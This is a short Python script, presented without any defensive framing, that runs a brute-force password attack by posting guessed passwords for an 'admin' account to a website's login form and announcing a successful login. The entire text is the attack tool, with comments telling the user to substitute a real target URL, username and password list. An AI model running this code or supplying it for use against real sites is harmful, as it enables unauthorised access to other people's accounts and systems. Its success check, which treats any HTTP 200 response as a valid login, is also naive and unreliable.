import requests

# Function to perform brute force attack on a website
def brute_force(url, username, password_list):
    for password in password_list:
        payload = {
            "username": username,
            "password": password
        }
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            print("Login successful! Username:", username, "Password:", password)
            return
    
    print("Brute force attack failed. Password not found.")

# Usage example
target_url = "http://example.com/login"  # Replace with the login URL
target_username = "admin"  # Replace with the target username
passwords = ["password1", "password2", "password3"]  # Replace with the list of passwords to try

brute_force(target_url, target_username, passwords)
